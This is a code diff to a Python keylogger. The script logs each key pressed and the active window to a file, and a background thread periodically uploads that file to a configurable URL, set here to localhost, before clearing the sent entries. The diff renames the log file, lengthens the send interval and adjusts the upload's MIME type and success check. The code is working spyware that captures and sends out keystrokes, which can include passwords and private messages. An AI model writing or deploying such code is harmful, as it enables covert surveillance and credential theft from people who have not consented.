@@ -4,22 +4,24 @@ import requests # to send logs
 import threading # to make log sending repeat in background
 from datetime import datetime, timezone # to classify logs by time sent
 
-URL = 'https://127.0.0.1:8000/log' # the URL/IP to which you want to send the logs to
-INTERVAL = 3.0 # Interval between sending logs (in seconds). Don't make this too low because you're going to DDOS yourself.
+URL = 'http://127.0.0.1:8000/log' # the URL/IP to which you want to send the logs to
+INTERVAL = 10.0 # Interval between sending logs (in seconds). Don't make this too low because you're going to DDOS yourself.
+
+with open('keylogger-log','w') as l: # to create the file to avoid any errors
+    pass
 
 def send_log(): # send log
     try:
-        with open('log', 'rb') as log: # open the file in read-only mode binary  
-            file_payload = {}
-            time = str(datetime.now(timezone.utc).time())[:-7].replace(':','.') # get the current utc time, remove milliseconds portion, and switch colons to periods since you cant use colons in file names
-            file_name = f'keylogger-log-{time}'
+        with open('keylogger-log', 'rb') as log: # open the file in read-only mode binary
+            time = str(datetime.now(timezone.utc))[:-13].replace(':', '.') # get the current utc time, remove milliseconds portion, and switch colons to periods since you cant use colons in file names
+            log_name = f'keylogger-log-{time}'
             line_count = len(log.readlines()) # get the number of entries being sent so you know how many to delete from file later
-            file_payload = {'file':(file_name, log)} # make the payload for the file containing the file name and the file in binary
-            r = requests.post(URL, files=file_payload) # POST (send) the file
-            if not r.ok:
+            files = {'file' : (log_name, log, 'plain/text')} # make the payload for the file containing the file name, the file in binary, and its MIME type
+            r = requests.post(URL, files=files) # POST (send) the file
+            if not 300 > r.status_code >= 200:
                 pass # Leaves the entries to go through later if the request didn't go through
             else: # assume new entries were made during process of sending and delete only entries which were already sent
-                with open('log','r+') as l:
+                with open('keylogger-log','r+') as l:
                     lines = l.readlines() # get all the entries into an array
                     l.seek(0) # go to start of file
                     l.truncate() # erase the whole file before rewriting
@@ -44,7 +46,7 @@ while True:
         entry = f"Key Pressed: {key} Active Window: {window_name}" # make the entry
         print(entry) # for debugging purposes
         try:
-            with open("log", "a", encoding='utf-8') as log: # open the log file or make a new one if it doesnt exist
+            with open("keylogger-log", "a", encoding='utf-8') as log: # open the log file or make a new one if it doesnt exist
                 log.write(entry+'\n') # write the entry into the log
             # Reads the key pressed and active window and writes it into a file.
         except UnicodeEncodeError as e:
